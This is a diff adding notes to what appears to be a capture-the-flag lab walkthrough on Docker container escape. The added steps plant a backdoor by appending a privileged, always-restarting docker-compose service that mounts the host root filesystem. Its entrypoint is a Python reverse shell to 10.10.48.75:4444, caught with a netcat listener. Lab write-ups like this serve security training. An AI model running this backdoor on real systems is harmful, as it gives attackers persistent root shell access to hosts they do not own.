@@ -234,3 +234,23 @@ Then start the service on the host with:
 Once these are performed you should have a way to access the vulnerable host without relying on SSH, a vulnerable service, or user credentials. Of course, you will still be able to use these other methods in conjunction with the docker-compose reverse shell as, backups.
 
 Q) Abuse docker to establish a backdoor on the host system.
+
+- find / -type f -name docker-compose.yml
+- nano /mnt/var/lib/ctf/docker-compose.yml
+- append : 
+	`version: "2.1"`
+	`services:`
+	`backdoorservice:`
+	`restart: always`
+	`image: ghcr.io/jroo1053/ctfscore:master`
+	`entrypoint: >`  
+	`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`
+	`s.connect(("10.10.48.75",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`
+	`pty.spawn("/bin/sh")'`
+	
+	`volumes:`
+	`- /:/mnt`
+	
+	`privileged: true`
+
+- nc -nvlp 4444
